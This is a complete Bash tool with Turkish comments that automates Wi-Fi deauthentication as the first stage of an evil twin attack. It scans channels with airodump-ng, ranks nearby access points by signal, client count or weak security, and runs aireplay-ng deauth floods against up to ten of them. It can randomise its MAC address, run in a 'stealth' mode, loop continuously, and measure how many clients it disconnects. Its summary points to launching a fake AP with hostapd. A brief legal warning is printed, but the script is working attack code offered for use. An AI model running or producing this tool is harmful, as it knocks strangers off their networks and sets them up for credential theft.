#!/bin/bash

# Evil Twin Attack - Automated Deauthentication Attack Script
# Bu script otomatik olarak hedef ağları tarar ve deauth saldırısı yapar
# Kullanım: ./auto_deauth.sh [interface] [options]

# Renkli çıktı için ANSI kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${PURPLE}"
echo "═══════════════════════════════════════════════════════════════"
echo "                    EVIL TWIN ATTACK TOOLKIT                  "
echo "                  Automated Deauth Attack                     "
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

# Root kontrolü
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Bu script root yetkileri ile çalıştırılmalıdır!${NC}"
   echo -e "${YELLOW}[*] Kullanım: sudo $0 [interface] [options]${NC}"
   exit 1
fi

# Etik uyarı
echo -e "${RED}"
echo "⚠️  ETİK UYARI ⚠️"
echo "Bu araç yalnızca eğitim amaçlı ve kendi ağlarınızda test için kullanılmalıdır."
echo "Otomatik deauthentication saldırısı yasadışıdır ve ciddi hukuki sonuçları olabilir."
echo "Bu aracı kullanarak tüm sorumluluğu kabul etmiş olursunuz."
echo -e "${NC}"

# Parametreler
INTERFACE="$1"
TARGET_CHANNELS="1,6,11"  # Varsayılan kanallar
SCAN_DURATION="60"
ATTACK_DURATION="30"
ATTACK_INTERVAL="5"
MIN_SIGNAL_STRENGTH="-70"
MIN_CLIENT_COUNT="1"
OUTPUT_DIR="/tmp/evil_twin_auto"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="$OUTPUT_DIR/auto_deauth_$TIMESTAMP.txt"
TARGET_LIST_FILE="$OUTPUT_DIR/target_list_$TIMESTAMP.txt"
EXCLUDE_LIST=""
INCLUDE_ONLY=""
FILTER_SECURITY="WPA,WPA2,WEP"  # Hedef güvenlik türleri
FILTER_VENDOR=""
RANDOM_MAC=false
STEALTH_MODE=false
CONTINUOUS=false
VERBOSE=false
DRY_RUN=false
MAX_TARGETS="10"
PRIORITY_MODE="signal"  # signal, clients, security
AUTO_CHANNEL_HOP=true
SMART_TARGETING=true

# Global değişkenler
declare -A TARGET_APS
declare -A AP_CLIENTS
declare -A ATTACK_HISTORY
TOTAL_TARGETS=0
SUCCESSFUL_ATTACKS=0
FAILED_ATTACKS=0

# Fonksiyonlar
print_status() {
    echo -e "${BLUE}[*] $1${NC}"
    echo "$(date): [INFO] $1" >> "$LOG_FILE"
}

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
    echo "$(date): [SUCCESS] $1" >> "$LOG_FILE"
}

print_error() {
    echo -e "${RED}[!] $1${NC}"
    echo "$(date): [ERROR] $1" >> "$LOG_FILE"
}

print_warning() {
    echo -e "${YELLOW}[⚠] $1${NC}"
    echo "$(date): [WARNING] $1" >> "$LOG_FILE"
}

print_attack() {
    echo -e "${RED}[⚔] $1${NC}"
    echo "$(date): [ATTACK] $1" >> "$LOG_FILE"
}

# Kullanım bilgisi
show_usage() {
    echo -e "${YELLOW}Kullanım:${NC}"
    echo -e "  ${CYAN}$0 [interface] [options]${NC}"
    echo
    echo -e "${YELLOW}Parametreler:${NC}"
    echo -e "  ${CYAN}interface${NC}     Monitor mode'daki kablosuz arayüz"
    echo
    echo -e "${YELLOW}Seçenekler:${NC}"
    echo -e "  ${CYAN}-c, --channels <list>${NC}   Hedef kanallar (örn: 1,6,11)"
    echo -e "  ${CYAN}-s, --scan-time <sec>${NC}   Tarama süresi (varsayılan: 60)"
    echo -e "  ${CYAN}-a, --attack-time <sec>${NC} Saldırı süresi (varsayılan: 30)"
    echo -e "  ${CYAN}-i, --interval <sec>${NC}    Saldırı aralığı (varsayılan: 5)"
    echo -e "  ${CYAN}-S, --signal <dbm>${NC}      Min sinyal gücü (varsayılan: -70)"
    echo -e "  ${CYAN}-C, --min-clients <num>${NC} Min istemci sayısı (varsayılan: 1)"
    echo -e "  ${CYAN}-o, --output <dir>${NC}      Çıktı dizini"
    echo -e "  ${CYAN}-e, --exclude <list>${NC}    Hariç tutulacak BSSID'ler"
    echo -e "  ${CYAN}-I, --include <list>${NC}    Sadece bu BSSID'ler"
    echo -e "  ${CYAN}-f, --filter <types>${NC}    Güvenlik türü filtresi (WPA,WPA2,WEP)"
    echo -e "  ${CYAN}-V, --vendor <list>${NC}     Vendor filtresi"
    echo -e "  ${CYAN}-m, --max-targets <num>${NC} Max hedef sayısı (varsayılan: 10)"
    echo -e "  ${CYAN}-p, --priority <mode>${NC}   Öncelik modu (signal/clients/security)"
    echo -e "  ${CYAN}-r, --random-mac${NC}        Rastgele MAC adresi kullan"
    echo -e "  ${CYAN}-st, --stealth${NC}          Gizli mod (düşük paket oranı)"
    echo -e "  ${CYAN}-ch, --channel-hop${NC}      Otomatik kanal atlama"
    echo -e "  ${CYAN}-sm, --smart${NC}            Akıllı hedefleme"
    echo -e "  ${CYAN}-co, --continuous${NC}       Sürekli saldırı"
    echo -e "  ${CYAN}-d, --dry-run${NC}           Sadece tarama (saldırı yok)"
    echo -e "  ${CYAN}-v, --verbose${NC}           Detaylı çıktı"
    echo -e "  ${CYAN}-h, --help${NC}              Bu yardım mesajı"
    echo
    echo -e "${YELLOW}Örnekler:${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon -c 1,6,11 -s 120 -a 60${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon -f WPA2 -S -60 -C 3${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon -p clients -m 5 -st${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon -d -v${NC}  # Sadece tarama"
    echo
}

# Komut satırı argümanlarını işle
parse_arguments() {
    # İlk parametre pozisyonel
    if [ $# -ge 1 ]; then
        INTERFACE="$1"
        shift
    fi
    
    # Kalan parametreler seçenekler
    while [[ $# -gt 0 ]]; do
        case $1 in
            -c|--channels)
                TARGET_CHANNELS="$2"
                shift 2
                ;;
            -s|--scan-time)
                SCAN_DURATION="$2"
                shift 2
                ;;
            -a|--attack-time)
                ATTACK_DURATION="$2"
                shift 2
                ;;
            -i|--interval)
                ATTACK_INTERVAL="$2"
                shift 2
                ;;
            -S|--signal)
                MIN_SIGNAL_STRENGTH="$2"
                shift 2
                ;;
            -C|--min-clients)
                MIN_CLIENT_COUNT="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -e|--exclude)
                EXCLUDE_LIST="$2"
                shift 2
                ;;
            -I|--include)
                INCLUDE_ONLY="$2"
                shift 2
                ;;
            -f|--filter)
                FILTER_SECURITY="$2"
                shift 2
                ;;
            -V|--vendor)
                FILTER_VENDOR="$2"
                shift 2
                ;;
            -m|--max-targets)
                MAX_TARGETS="$2"
                shift 2
                ;;
            -p|--priority)
                PRIORITY_MODE="$2"
                shift 2
                ;;
            -r|--random-mac)
                RANDOM_MAC=true
                shift
                ;;
            -st|--stealth)
                STEALTH_MODE=true
                shift
                ;;
            -ch|--channel-hop)
                AUTO_CHANNEL_HOP=true
                shift
                ;;
            -sm|--smart)
                SMART_TARGETING=true
                shift
                ;;
            -co|--continuous)
                CONTINUOUS=true
                shift
                ;;
            -d|--dry-run)
                DRY_RUN=true
                shift
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            -*)
                print_error "Bilinmeyen seçenek: $1"
                show_usage
                exit 1
                ;;
            *)
                print_error "Fazla parametre: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

# Parametreleri kontrol et
validate_parameters() {
    if [ -z "$INTERFACE" ]; then
        print_error "Arayüz belirtilmedi!"
        show_usage
        exit 1
    fi
    
    # Arayüz kontrolü
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        print_error "Arayüz bulunamadı: $INTERFACE"
        exit 1
    fi
    
    # Monitor mode kontrolü
    if ! iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        print_error "Arayüz monitor mode'da değil: $INTERFACE"
        print_status "Monitor mode için: airmon-ng start $INTERFACE"
        exit 1
    fi
    
    # Öncelik modu kontrolü
    if [[ ! "$PRIORITY_MODE" =~ ^(signal|clients|security)$ ]]; then
        print_error "Geçersiz öncelik modu: $PRIORITY_MODE"
        print_status "Geçerli modlar: signal, clients, security"
        exit 1
    fi
}

# Çıktı dizinini hazırla
setup_output_directory() {
    if [ ! -d "$OUTPUT_DIR" ]; then
        mkdir -p "$OUTPUT_DIR"
        print_status "Çıktı dizini oluşturuldu: $OUTPUT_DIR"
    fi
    
    # Dosya yollarını güncelle
    LOG_FILE="$OUTPUT_DIR/auto_deauth_$TIMESTAMP.txt"
    TARGET_LIST_FILE="$OUTPUT_DIR/target_list_$TIMESTAMP.txt"
    
    print_status "Log dosyası: $LOG_FILE"
    print_status "Hedef listesi: $TARGET_LIST_FILE"
}

# MAC adresi değiştir
change_mac_address() {
    if [ "$RANDOM_MAC" = true ]; then
        print_status "MAC adresi değiştiriliyor..."
        
        # Rastgele MAC oluştur
        local new_mac=$(printf '02:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
        
        # Arayüzü kapat
        ifconfig "$INTERFACE" down
        
        # MAC değiştir
        ifconfig "$INTERFACE" hw ether "$new_mac"
        
        # Arayüzü aç
        ifconfig "$INTERFACE" up
        
        if [ $? -eq 0 ]; then
            print_success "MAC adresi değiştirildi: $new_mac"
        else
            print_warning "MAC adresi değiştirilemedi"
        fi
    fi
}

# Vendor tespiti
get_vendor() {
    local mac="$1"
    local oui=$(echo "$mac" | cut -d: -f1-3 | tr '[:lower:]' '[:upper:]')
    
    case "$oui" in
        "00:50:56"|"00:0C:29"|"00:05:69") echo "VMware" ;;
        "08:00:27") echo "VirtualBox" ;;
        "00:16:3E") echo "Xen" ;;
        "52:54:00") echo "QEMU" ;;
        "AC:DE:48"|"28:CF:E9"|"A4:83:E7") echo "Apple" ;;
        "00:1B:44"|"00:25:00"|"00:50:F2") echo "Microsoft" ;;
        "00:23:24"|"00:26:08"|"D8:50:E6") echo "Samsung" ;;
        "B8:27:EB"|"DC:A6:32") echo "Raspberry_Pi" ;;
        "00:E0:4C"|"00:90:A9"|"00:A0:F8") echo "Realtek" ;;
        "00:13:02"|"00:40:05"|"00:E0:91") echo "Cisco" ;;
        *) echo "Unknown" ;;
    esac
}

# Ağları tara
scan_networks() {
    print_status "Ağ taraması başlatılıyor..."
    
    local scan_file="/tmp/auto_scan_$TIMESTAMP"
    local channels_array=()
    
    # Kanal listesini diziye çevir
    IFS=',' read -ra channels_array <<< "$TARGET_CHANNELS"
    
    print_status "Hedef kanallar: ${channels_array[*]}"
    print_status "Tarama süresi: $SCAN_DURATION saniye"
    
    # Her kanal için tarama yap
    for channel in "${channels_array[@]}"; do
        channel=$(echo "$channel" | tr -d ' ')  # Boşlukları temizle
        
        print_status "Kanal $channel taranıyor..."
        
        # Kanala ayarla
        iwconfig "$INTERFACE" channel "$channel"
        
        # Tarama yap
        local channel_scan_time=$((SCAN_DURATION / ${#channels_array[@]}))
        [ "$channel_scan_time" -lt 10 ] && channel_scan_time=10
        
        timeout "$channel_scan_time" airodump-ng -c "$channel" -w "${scan_file}_ch${channel}" --output-format csv "$INTERFACE" > /dev/null 2>&1
        
        if [ "$VERBOSE" = true ]; then
            print_status "Kanal $channel taraması tamamlandı"
        fi
    done
    
    print_success "Ağ taraması tamamlandı"
    
    # Tarama sonuçlarını birleştir ve analiz et
    analyze_scan_results "$scan_file"
}

# Tarama sonuçlarını analiz et
analyze_scan_results() {
    local scan_file="$1"
    
    print_status "Tarama sonuçları analiz ediliyor..."
    
    # Tüm CSV dosyalarını birleştir
    local combined_csv="/tmp/combined_scan_$TIMESTAMP.csv"
    echo "BSSID,First time seen,Last time seen,channel,Speed,Privacy,Cipher,Authentication,Power,# beacons,# IV,LAN IP,ID-length,ESSID,Key" > "$combined_csv"
    
    for csv_file in ${scan_file}_ch*-01.csv; do
        if [ -f "$csv_file" ]; then
            # Başlık satırını atla ve birleştir
            tail -n +2 "$csv_file" | head -n -3 >> "$combined_csv"
        fi
    done
    
    # AP'leri analiz et
    local ap_count=0
    
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        # Boş satırları atla
        [ -z "$bssid" ] && continue
        
        # BSSID formatını kontrol et
        if [[ "$bssid" =~ ^[0-9A-Fa-f:]+$ ]] && [ ${#bssid} -eq 17 ]; then
            # Filtreleri uygula
            if should_target_ap "$bssid" "$essid" "$privacy" "$power" "$channel"; then
                # AP bilgilerini kaydet
                TARGET_APS["$bssid,essid"]="$essid"
                TARGET_APS["$bssid,channel"]="$channel"
                TARGET_APS["$bssid,power"]="$power"
                TARGET_APS["$bssid,security"]="$privacy"
                TARGET_APS["$bssid,vendor"]=$(get_vendor "$bssid")
                
                ((ap_count++))
                
                if [ "$VERBOSE" = true ]; then
                    print_status "Hedef AP bulundu: $bssid (${essid:-"Hidden"}) - $power dBm"
                fi
            fi
        fi
    done < <(tail -n +2 "$combined_csv")
    
    print_success "$ap_count hedef AP tespit edildi"
    
    # İstemci sayılarını tespit et
    if [ "$SMART_TARGETING" = true ]; then
        detect_client_counts
    fi
    
    # Hedefleri önceliklendir
    prioritize_targets
    
    # Temizlik
    rm -f ${scan_file}_ch*-01.csv ${scan_file}_ch*-01.kismet.csv ${scan_file}_ch*-01.kismet.netxml
    rm -f "$combined_csv"
}

# AP'nin hedeflenmesi gerekip gerekmediğini kontrol et
should_target_ap() {
    local bssid="$1"
    local essid="$2"
    local security="$3"
    local power="$4"
    local channel="$5"
    
    # Hariç tutma listesi kontrolü
    if [ -n "$EXCLUDE_LIST" ]; then
        IFS=',' read -ra exclude_array <<< "$EXCLUDE_LIST"
        for exclude_bssid in "${exclude_array[@]}"; do
            if [ "$bssid" = "$(echo "$exclude_bssid" | tr -d ' ')" ]; then
                return 1
            fi
        done
    fi
    
    # Sadece dahil etme listesi kontrolü
    if [ -n "$INCLUDE_ONLY" ]; then
        IFS=',' read -ra include_array <<< "$INCLUDE_ONLY"
        local found=false
        for include_bssid in "${include_array[@]}"; do
            if [ "$bssid" = "$(echo "$include_bssid" | tr -d ' ')" ]; then
                found=true
                break
            fi
        done
        [ "$found" = false ] && return 1
    fi
    
    # Sinyal gücü kontrolü
    if [ -n "$power" ] && [ "$power" != " " ]; then
        if [ "$power" -lt "$MIN_SIGNAL_STRENGTH" ]; then
            return 1
        fi
    fi
    
    # Güvenlik türü filtresi
    if [ -n "$FILTER_SECURITY" ]; then
        IFS=',' read -ra security_array <<< "$FILTER_SECURITY"
        local security_match=false
        for sec_type in "${security_array[@]}"; do
            if [[ "$security" == *"$(echo "$sec_type" | tr -d ' ')"* ]]; then
                security_match=true
                break
            fi
        done
        [ "$security_match" = false ] && return 1
    fi
    
    # Vendor filtresi
    if [ -n "$FILTER_VENDOR" ]; then
        local vendor=$(get_vendor "$bssid")
        IFS=',' read -ra vendor_array <<< "$FILTER_VENDOR"
        local vendor_match=false
        for filter_vendor in "${vendor_array[@]}"; do
            if [[ "$vendor" == *"$(echo "$filter_vendor" | tr -d ' ')"* ]]; then
                vendor_match=true
                break
            fi
        done
        [ "$vendor_match" = false ] && return 1
    fi
    
    return 0
}

# İstemci sayılarını tespit et
detect_client_counts() {
    print_status "İstemci sayıları tespit ediliyor..."
    
    for bssid in $(printf '%s\n' "${!TARGET_APS[@]}" | grep ',essid$' | cut -d, -f1); do
        local channel="${TARGET_APS[$bssid,channel]}"
        
        # Kısa istemci taraması
        iwconfig "$INTERFACE" channel "$channel"
        
        local client_scan_file="/tmp/client_scan_${bssid//:/}_$TIMESTAMP"
        timeout 15 airodump-ng -c "$channel" --bssid "$bssid" -w "$client_scan_file" --output-format csv "$INTERFACE" > /dev/null 2>&1
        
        local csv_file="${client_scan_file}-01.csv"
        
        if [ -f "$csv_file" ]; then
            # İstemci sayısını hesapla
            local client_count=$(awk -F',' 'NF==14 && /^[0-9A-Fa-f:]*,/ && $6 != "" {next} /^[0-9A-Fa-f:]*,/ && NF<14 { 
                gsub(/^ +| +$/, "", $6)
                if ($6 == bssid) count++
            } END {print count+0}' bssid="$bssid" "$csv_file")
            
            TARGET_APS["$bssid,clients"]="$client_count"
            
            if [ "$VERBOSE" = true ]; then
                print_status "$bssid: $client_count istemci"
            fi
            
            # Temizlik
            rm -f "${client_scan_file}"*
        else
            TARGET_APS["$bssid,clients"]="0"
        fi
    done
}

# Hedefleri önceliklendir
prioritize_targets() {
    print_status "Hedefler önceliklendiriliyor (mod: $PRIORITY_MODE)..."
    
    # Hedef listesi dosyasını oluştur
    echo "# Otomatik Deauth Hedef Listesi - $(date)" > "$TARGET_LIST_FILE"
    echo "# Öncelik Modu: $PRIORITY_MODE" >> "$TARGET_LIST_FILE"
    echo "# BSSID,ESSID,Channel,Power,Security,Clients,Vendor,Priority" >> "$TARGET_LIST_FILE"
    
    # Öncelik hesapla ve sırala
    declare -A target_priorities
    
    for bssid in $(printf '%s\n' "${!TARGET_APS[@]}" | grep ',essid$' | cut -d, -f1); do
        local essid="${TARGET_APS[$bssid,essid]}"
        local channel="${TARGET_APS[$bssid,channel]}"
        local power="${TARGET_APS[$bssid,power]}"
        local security="${TARGET_APS[$bssid,security]}"
        local clients="${TARGET_APS[$bssid,clients]:-0}"
        local vendor="${TARGET_APS[$bssid,vendor]}"
        
        # Öncelik hesapla
        local priority=0
        
        case "$PRIORITY_MODE" in
            "signal")
                # Sinyal gücüne göre (daha yüksek = daha iyi)
                priority=$((100 + power))
                ;;
            "clients")
                # İstemci sayısına göre
                priority=$((clients * 10))
                # Sinyal gücü bonusu
                priority=$((priority + (100 + power) / 10))
                ;;
            "security")
                # Güvenlik türüne göre
                case "$security" in
                    *"WEP"*) priority=100 ;;
                    *"WPA"*) priority=80 ;;
                    *"WPA2"*) priority=60 ;;
                    *"WPA3"*) priority=40 ;;
                    *) priority=20 ;;
                esac
                # İstemci sayısı bonusu
                priority=$((priority + clients * 5))
                ;;
        esac
        
        # Minimum istemci sayısı kontrolü
        if [ "$clients" -lt "$MIN_CLIENT_COUNT" ]; then
            priority=$((priority / 2))  # Önceliği düşür
        fi
        
        target_priorities["$bssid"]="$priority"
        
        # Dosyaya yaz
        echo "$bssid,${essid:-"Hidden"},$channel,$power,$security,$clients,$vendor,$priority" >> "$TARGET_LIST_FILE"
    done
    
    # En yüksek öncelikli hedefleri seç
    local selected_targets=()
    local count=0
    
    for bssid in $(for key in "${!target_priorities[@]}"; do echo "$key ${target_priorities[$key]}"; done | sort -k2 -nr | head -n "$MAX_TARGETS" | cut -d' ' -f1); do
        selected_targets+=("$bssid")
        ((count++))
    done
    
    TOTAL_TARGETS="$count"
    
    print_success "$TOTAL_TARGETS hedef seçildi (maksimum: $MAX_TARGETS)"
    
    # Seçilen hedefleri göster
    echo
    echo -e "${GREEN}🎯 SEÇİLEN HEDEFLER${NC}"
    printf "%-18s %-15s %-3s %-6s %-8s %-8s %-12s %s\n" "BSSID" "ESSID" "CH" "Power" "Security" "Clients" "Vendor" "Priority"
    echo "────────────────────────────────────────────────────────────────────────────────────────"
    
    for bssid in "${selected_targets[@]}"; do
        local essid="${TARGET_APS[$bssid,essid]}"
        local channel="${TARGET_APS[$bssid,channel]}"
        local power="${TARGET_APS[$bssid,power]}"
        local security="${TARGET_APS[$bssid,security]}"
        local clients="${TARGET_APS[$bssid,clients]:-0}"
        local vendor="${TARGET_APS[$bssid,vendor]}"
        local priority="${target_priorities[$bssid]}"
        
        printf "%-18s %-15s %-3s %-6s %-8s %-8s %-12s %s\n" "$bssid" "${essid:-"Hidden"}" "$channel" "$power" "${security:0:8}" "$clients" "$vendor" "$priority"
    done
    
    echo
    
    # Global hedef listesini güncelle
    SELECTED_TARGETS=("${selected_targets[@]}")
}

# Deauth saldırısı yap
perform_deauth_attack() {
    local target_bssid="$1"
    local target_channel="${TARGET_APS[$target_bssid,channel]}"
    local target_essid="${TARGET_APS[$target_bssid,essid]}"
    local target_clients="${TARGET_APS[$target_bssid,clients]:-0}"
    
    print_attack "Saldırı başlatılıyor: $target_bssid (${target_essid:-"Hidden"})"
    
    # Kanala ayarla
    iwconfig "$INTERFACE" channel "$target_channel"
    
    # Saldırı parametreleri
    local packet_count="0"  # Sürekli
    if [ "$STEALTH_MODE" = true ]; then
        packet_count="5"
    fi
    
    # Saldırı komutunu oluştur
    local attack_cmd="aireplay-ng --deauth $packet_count -a $target_bssid $INTERFACE"
    
    if [ "$VERBOSE" = true ]; then
        print_status "Komut: $attack_cmd"
    fi
    
    # Saldırıyı başlat
    local start_time=$(date +%s)
    
    if [ "$STEALTH_MODE" = true ]; then
        # Gizli mod - aralıklı saldırı
        local attack_rounds=$((ATTACK_DURATION / ATTACK_INTERVAL))
        
        for ((i=1; i<=attack_rounds; i++)); do
            if [ "$VERBOSE" = true ]; then
                print_status "Saldırı turu $i/$attack_rounds"
            fi
            
            timeout "$ATTACK_INTERVAL" aireplay-ng --deauth 5 -a "$target_bssid" "$INTERFACE" > /dev/null 2>&1
            
            # Kısa bekleme
            sleep 2
        done
    else
        # Normal mod - sürekli saldırı
        timeout "$ATTACK_DURATION" aireplay-ng --deauth 0 -a "$target_bssid" "$INTERFACE" > /dev/null 2>&1
    fi
    
    local end_time=$(date +%s)
    local actual_duration=$((end_time - start_time))
    
    # Saldırı sonucunu kontrol et
    local success=false
    
    # Kısa bekleme sonrası istemci sayısını kontrol et
    sleep 5
    
    local post_attack_file="/tmp/post_attack_${target_bssid//:/}_$TIMESTAMP"
    timeout 10 airodump-ng -c "$target_channel" --bssid "$target_bssid" -w "$post_attack_file" --output-format csv "$INTERFACE" > /dev/null 2>&1
    
    local csv_file="${post_attack_file}-01.csv"
    
    if [ -f "$csv_file" ]; then
        local current_clients=$(awk -F',' 'NF==14 && /^[0-9A-Fa-f:]*,/ && $6 != "" {next} /^[0-9A-Fa-f:]*,/ && NF<14 { 
            gsub(/^ +| +$/, "", $6)
            if ($6 == bssid) count++
        } END {print count+0}' bssid="$target_bssid" "$csv_file")
        
        if [ "$current_clients" -lt "$target_clients" ]; then
            success=true
            print_success "Saldırı başarılı: $target_bssid ($target_clients → $current_clients istemci)"
            ((SUCCESSFUL_ATTACKS++))
        else
            print_warning "Saldırı etkisiz: $target_bssid ($target_clients → $current_clients istemci)"
            ((FAILED_ATTACKS++))
        fi
        
        # Temizlik
        rm -f "${post_attack_file}"*
    else
        print_warning "Saldırı sonucu kontrol edilemedi: $target_bssid"
        ((FAILED_ATTACKS++))
    fi
    
    # Saldırı geçmişine kaydet
    ATTACK_HISTORY["$target_bssid"]="$(date +%s)"
    
    print_status "Saldırı süresi: ${actual_duration}s"
    
    return $([ "$success" = true ] && echo 0 || echo 1)
}

# Otomatik saldırı döngüsü
auto_attack_loop() {
    print_status "Otomatik saldırı döngüsü başlatılıyor..."
    
    local round=1
    
    while true; do
        echo
        print_status "Saldırı turu #$round"
        
        # Hedefleri sırası ile saldır
        for target_bssid in "${SELECTED_TARGETS[@]}"; do
            if [ "$DRY_RUN" = true ]; then
                print_status "[DRY RUN] Saldırı simülasyonu: $target_bssid"
                sleep 2
            else
                perform_deauth_attack "$target_bssid"
                
                # Hedefler arası bekleme
                if [ ${#SELECTED_TARGETS[@]} -gt 1 ]; then
                    print_status "Sonraki hedefe geçiliyor... (${ATTACK_INTERVAL}s bekleme)"
                    sleep "$ATTACK_INTERVAL"
                fi
            fi
        done
        
        ((round++))
        
        # Sürekli mod kontrolü
        if [ "$CONTINUOUS" = false ]; then
            break
        fi
        
        # Tur arası bekleme
        print_status "Tur tamamlandı. 60 saniye bekleniyor..."
        sleep 60
        
        # Yeni tarama (her 5 turda bir)
        if [ $((round % 5)) -eq 0 ]; then
            print_status "Yeniden tarama yapılıyor..."
            scan_networks
        fi
    done
}

# Özet rapor
show_summary() {
    local end_time=$(date +%s)
    local total_duration=$((end_time - $(date -d "$(head -1 "$LOG_FILE" | cut -d: -f1-3)" +%s 2>/dev/null || echo $(date +%s))))
    
    echo
    echo -e "${GREEN}"
    echo "═══════════════════════════════════════════════════════════════"
    echo "                    OTOMATIK SALDIRI RAPORU                   "
    echo "═══════════════════════════════════════════════════════════════"
    echo -e "${NC}"
    
    echo -e "${CYAN}Toplam Süre:${NC} ${total_duration}s"
    echo -e "${CYAN}Toplam Hedef:${NC} $TOTAL_TARGETS"
    echo -e "${GREEN}Başarılı Saldırı:${NC} $SUCCESSFUL_ATTACKS"
    echo -e "${RED}Başarısız Saldırı:${NC} $FAILED_ATTACKS"
    
    if [ "$TOTAL_TARGETS" -gt 0 ]; then
        local success_rate=$(( (SUCCESSFUL_ATTACKS * 100) / (SUCCESSFUL_ATTACKS + FAILED_ATTACKS) ))
        echo -e "${CYAN}Başarı Oranı:${NC} %$success_rate"
    fi
    
    echo
    echo -e "${CYAN}Parametreler:${NC}"
    echo -e "  ${CYAN}Kanallar:${NC} $TARGET_CHANNELS"
    echo -e "  ${CYAN}Öncelik Modu:${NC} $PRIORITY_MODE"
    echo -e "  ${CYAN}Min Sinyal:${NC} $MIN_SIGNAL_STRENGTH dBm"
    echo -e "  ${CYAN}Min İstemci:${NC} $MIN_CLIENT_COUNT"
    echo -e "  ${CYAN}Gizli Mod:${NC} $([ "$STEALTH_MODE" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Sürekli Mod:${NC} $([ "$CONTINUOUS" = true ] && echo "Evet" || echo "Hayır")"
    
    echo
    echo -e "${YELLOW}Dosyalar:${NC}"
    echo -e "  ${CYAN}Log:${NC} $LOG_FILE"
    echo -e "  ${CYAN}Hedef Listesi:${NC} $TARGET_LIST_FILE"
    
    echo
    
    if [ "$DRY_RUN" = false ]; then
        print_status "Evil Twin saldırısı için öneriler:"
        echo -e "  ${CYAN}1. En başarılı hedefleri seçin${NC}"
        echo -e "  ${CYAN}2. Sahte AP başlatın: hostapd config/hostapd.conf${NC}"
        echo -e "  ${CYAN}3. Bu scripti sürekli çalıştırın: $0 $INTERFACE -co${NC}"
    fi
    
    echo
}

# Temizlik
cleanup() {
    print_status "Temizlik yapılıyor..."
    
    # Arka plan süreçlerini sonlandır
    pkill -f "aireplay-ng.*$INTERFACE" 2>/dev/null
    pkill -f "airodump-ng.*$INTERFACE" 2>/dev/null
    
    # Geçici dosyaları temizle
    rm -f /tmp/auto_scan_* /tmp/client_scan_* /tmp/post_attack_* /tmp/combined_scan_*
    
    print_success "Temizlik tamamlandı"
}

# Ana fonksiyon
main() {
    echo
    print_status "Otomatik deauth attack başlatılıyor..."
    echo
    
    # Parametreleri kontrol et
    validate_parameters
    
    # Çıktı dizinini hazırla
    setup_output_directory
    
    # MAC adresi değiştir
    change_mac_address
    
    # Parametreleri göster
    print_status "Saldırı parametreleri:"
    echo -e "  ${CYAN}Arayüz:${NC} $INTERFACE"
    echo -e "  ${CYAN}Hedef Kanallar:${NC} $TARGET_CHANNELS"
    echo -e "  ${CYAN}Tarama Süresi:${NC} $SCAN_DURATION saniye"
    echo -e "  ${CYAN}Saldırı Süresi:${NC} $ATTACK_DURATION saniye"
    echo -e "  ${CYAN}Saldırı Aralığı:${NC} $ATTACK_INTERVAL saniye"
    echo -e "  ${CYAN}Min Sinyal Gücü:${NC} $MIN_SIGNAL_STRENGTH dBm"
    echo -e "  ${CYAN}Min İstemci Sayısı:${NC} $MIN_CLIENT_COUNT"
    echo -e "  ${CYAN}Max Hedef Sayısı:${NC} $MAX_TARGETS"
    echo -e "  ${CYAN}Öncelik Modu:${NC} $PRIORITY_MODE"
    echo -e "  ${CYAN}Gizli Mod:${NC} $([ "$STEALTH_MODE" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Sürekli Mod:${NC} $([ "$CONTINUOUS" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Sadece Tarama:${NC} $([ "$DRY_RUN" = true ] && echo "Evet" || echo "Hayır")"
    echo
    
    # Onay al (sürekli mod değilse)
    if [ "$CONTINUOUS" = false ] && [ "$DRY_RUN" = false ]; then
        read -p "Otomatik saldırıyı başlatmak istiyor musunuz? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            print_status "Saldırı iptal edildi"
            exit 0
        fi
    fi
    
    # Ağları tara
    scan_networks
    
    # Hedef bulunamadıysa çık
    if [ "$TOTAL_TARGETS" -eq 0 ]; then
        print_error "Hiç hedef bulunamadı!"
        print_status "Filtreleri kontrol edin veya tarama süresini artırın"
        exit 1
    fi
    
    # Saldırı döngüsünü başlat
    auto_attack_loop
    
    # Özet raporu göster
    show_summary
    
    print_success "Otomatik deauth attack tamamlandı!"
}

# Sinyal yakalama
trap cleanup EXIT INT TERM

# Komut satırı argümanlarını işle
parse_arguments "$@"

# Ana fonksiyonu çalıştır
main